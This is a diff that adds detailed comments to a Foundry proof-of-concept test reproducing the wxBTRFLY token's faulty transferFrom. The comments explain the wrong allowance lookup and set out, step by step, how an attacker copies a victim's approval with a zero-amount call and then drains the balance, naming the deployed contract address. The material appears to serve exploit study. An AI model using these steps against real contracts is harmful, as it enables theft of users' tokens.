@@ -12,6 +12,25 @@ The vulnerability would have allowed a malicious attacker to assign a user’s a
 
 a faulty implementation of standard transferFrom() ERC-20 function in wxBTRFLY token.
 */
+
+// VULNERABILITY: Incorrect spender in custom transferFrom allowance update
+// Root cause: In wxBTRFLY (deployed at 0x186E55C0BebD2f69348d94C4A27556d93C5Bd36C), the FrozenToken contract
+// overrides ERC20.transferFrom with a buggy version:
+//     function transferFrom(address sender, address recipient, uint256 amount) public virtual override onlyAuthorisedOperators returns (bool) {
+//         _transfer(sender, recipient, amount);
+//         _approve(sender, msg.sender, allowance(sender, recipient ).sub(amount, "ERC20: transfer amount exceeds allowance"));
+//         return true;
+//     }
+// The second argument to allowance() is `recipient` (the `to` param) instead of `msg.sender` (the actual spender in the call).
+// This is a copy-paste error confusing the standard ERC20.transferFrom logic (which correctly does allowance deduction for msg.sender).
+// _approve(sender, msg.sender, X) then GRANTS/OVERWRITES an allowance FROM sender TO the CALLER (msg.sender) equal to
+// the (previously granted) allowance(sender, recipient) minus amount.
+// Why vulnerable: ERC20 allowance is mapping[owner][spender]. By choosing a `recipient` that Alice previously
+// approved (AliceContract), any caller (Bob) can force Alice's allowance[Alice][Bob] = allowance(Alice, AliceContract).
+// The onlyAuthorisedOperators modifier (which gates on !isTokenFrozen || isAuthorisedOperators[msg.sender]) is
+// bypassed in PoC via owner.unFreezeToken() which sets isTokenFrozen=false (see setUp + testExploit line ~34).
+// Impact: Attacker can hijack any approval and drain the sender's entire wxBTRFLY balance. Breaks ERC20 security model for approvals.
+
 contract RedactedCartelExploit is Test {
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
     IRedactedCartelSafeERC20 wxBTRFLY = IRedactedCartelSafeERC20(0x186E55C0BebD2f69348d94C4A27556d93C5Bd36C);
@@ -31,6 +50,26 @@ contract RedactedCartelExploit is Test {
     }
 
     function testExploit() public {
+        // VULNERABILITY: [as documented above at contract level]
+        // EXPLOIT STEPS:
+        // 1. Bypass freeze modifier: cheats.prank(owner); wxBTRFLY.unFreezeToken(); (calls FrozenToken.unFreezeToken which sets isTokenFrozen=false; see wxBTRFLY owner at L19 in this file, and modifier at contract source)
+        //    This makes onlyAuthorisedOperators pass for anyone (since !isTokenFrozen).
+        // 2. Victim Alice grants approval: cheats.prank(Alice); wxBTRFLY.approve(AliceContract, AMOUNT); (L~45)
+        //    This sets _allowances[Alice][AliceContract] = AMOUNT (standard approve in ERC20).
+        //    At this point allowance(Alice, Bob) == 0.
+        // 3. Attacker (Bob) triggers the flawed transferFrom with zero amount targeting the approved recipient:
+        //    cheats.prank(Bob); wxBTRFLY.transferFrom(Alice, AliceContract, 0); (L~63)
+        //    Inside buggy transferFrom (L52-55 in comment):
+        //      - _transfer(Alice, AliceContract, 0) — no-op, balance unchanged (since amount=0)
+        //      - _approve(Alice, Bob /*msg.sender*/, allowance(Alice, AliceContract /*WRONG param*/).sub(0) )
+        //      => this sets _allowances[Alice][Bob] = _allowances[Alice][AliceContract]  (the victim's approval is copied to attacker)
+        // 4. Attacker drains: cheats.prank(Bob); wxBTRFLY.transferFrom(Alice, Bob, AMOUNT); (L~69)
+        //    Now the caller's allowance check passes because Bob has the stolen allowance, _transfer moves tokens to Bob.
+        //    Alice ends up with 0, Bob steals the full balance.
+        //
+        // Why amount=0 is key: sub(0) doesn't reduce the copied value; transfer amount=0 is allowed by ERC20 and doesn't revert.
+        // The bug exists because the override replaced the correct `msg.sender` (spender) with `recipient` in the allowance() lookup.
+
         //quick hack to bypass the "onlyAuthorisedOperators" modifier
         cheats.prank(owner);
         wxBTRFLY.unFreezeToken();
